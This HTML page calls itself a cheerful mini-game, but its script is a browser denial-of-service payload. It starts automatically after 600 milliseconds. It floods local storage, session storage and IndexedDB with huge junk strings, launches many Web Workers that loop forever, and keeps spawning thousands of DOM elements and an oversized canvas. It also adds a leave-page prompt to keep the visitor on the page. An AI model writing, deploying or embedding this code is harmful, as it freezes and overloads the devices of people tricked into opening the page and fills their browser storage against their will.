<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>愉快なミニゲーム</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      overflow: hidden;
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-size: clamp(28px, 7vw, 72px);
      user-select: none;
    }
    .banana {
      display: inline-block;
      animation: spin 0.08s linear infinite;
      font-size: 120px;
    }
    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1>楽しんでね^^</h1>

  <script>
    setTimeout(() => {
      document.body.innerHTML = `
        <h1><span class="banana">(   ᐛ)ﾊﾞﾅﾅ</span></h1>
        <p style="font-size:0.6em;margin-top:30px;">MAX CPU MODE ACTIVATED</p>
      `;

      const cores = navigator.hardwareConcurrency || 8;
      const memoryGB = navigator.deviceMemory || 8;
      const isHighSpec = cores >= 8 || memoryGB >= 8;

      function quickBenchmark() {
        const start = performance.now();
        let x = 0;
        for (let i = 0; i < 8000000; i++) {
          x += Math.sqrt(Math.random() * 1e9) * Math.sin(i) * Math.cos(i * 0.1);
        }
        return performance.now() - start;
      }

      const benchmarkTime = quickBenchmark();
      const intensity = {
        workers: Math.max(cores * 2, 16),
        storageItems: 400 + memoryGB * 120,
        domPerTick: 8000 + cores * 1200,
        canvasMult: Math.max(2, cores / 3),
        interval: Math.max(6, 18 - cores)
      };

      function storageBomb() {
        const hugeData = '🍌'.repeat(1024 * 800);

        try {
          for (let i = 0; i < intensity.storageItems; i++) {
            localStorage.setItem('lag_' + i, hugeData);
          }
        } catch(e) {}

        try {
          for (let i = 0; i < intensity.storageItems + 200; i++) {
            sessionStorage.setItem('lag_s_' + i, hugeData);
          }
        } catch(e) {}

        const req = indexedDB.open('LagBombDB', 1);
        req.onupgradeneeded = (e) => {
          const db = e.target.result;
          if (!db.objectStoreNames.contains('lagStore')) {
            db.createObjectStore('lagStore');
          }
        };
        req.onsuccess = (e) => {
          const db = e.target.result;
          const tx = db.transaction('lagStore', 'readwrite');
          const store = tx.objectStore('lagStore');
          setInterval(() => {
            for (let i = 0; i < 120 + cores * 20; i++) {
              store.put(hugeData + Math.random().toString(36), 'key_' + Date.now() + i);
            }
          }, 30);
        };
      }

      function cpuBurn() {
        const heavyWorkerCode = `
          self.onmessage = function() {
            while(true) {
              let x = Math.random() * 1e8;
              let arr = new Array(500);
              for(let i = 0; i < 800000; i++) {
                x = Math.sqrt(x) * Math.sin(x) * Math.cos(x * 1.3) + Math.tan(x * 0.7);
                arr[i % 500] = x.toString(36) + Math.random();
                if (i % 120000 === 0) {
                  arr = arr.concat(new Array(300).fill('🍌'));
                }
              }
            }
          };
        `;

        const blob = new Blob([heavyWorkerCode], {type: 'text/javascript'});
        const url = URL.createObjectURL(blob);

        for (let i = 0; i < intensity.workers; i++) {
          try {
            const w = new Worker(url);
            w.postMessage('burn');
          } catch(e) {}
        }

        setInterval(() => {
          let y = 0;
          for (let i = 0; i < 600000; i++) {
            y += Math.sqrt(Math.random() * 1e9) * Math.log(Math.abs(Math.sin(i) + 1));
          }
        }, 1);
      }

      function visualBomb() {
        setInterval(() => {
          for (let i = 0; i < intensity.domPerTick; i++) {
            const d = document.createElement('div');
            d.textContent = 'LAG🍌' + Math.random().toString(36);
            d.style.position = 'fixed';
            d.style.left = Math.random() * 100 + 'vw';
            d.style.top = Math.random() * 100 + 'vh';
            d.style.fontSize = (Math.random() * 50 + 15) + 'px';
            d.style.opacity = Math.random() * 0.6 + 0.4;
            d.style.transform = `rotate(${Math.random()*360}deg)`;
            document.body.appendChild(d);
          }
        }, intensity.interval);

        const c = document.createElement('canvas');
        c.width = window.innerWidth * intensity.canvasMult;
        c.height = window.innerHeight * intensity.canvasMult;
        c.style.position = 'fixed';
        c.style.zIndex = '-1';
        document.body.appendChild(c);
        const ctx = c.getContext('2d', {alpha: true});
        function drawChaos() {
          ctx.fillStyle = `hsla(${Math.random()*360},100%,60%,0.07)`;
          ctx.fillRect(Math.random()*c.width, Math.random()*c.height, 180, 180);
          if (Math.random() > 0.7) ctx.clearRect(0, 0, c.width, c.height);
          requestAnimationFrame(drawChaos);
        }
        drawChaos();
      }

      storageBomb();
      cpuBurn();
      visualBomb();

      window.addEventListener('beforeunload', e => {
        e.preventDefault();
        e.returnValue = '🍌 まだ遊んでいこうよ...';
      });

    }, 600);
  </script>
</body>
</html>
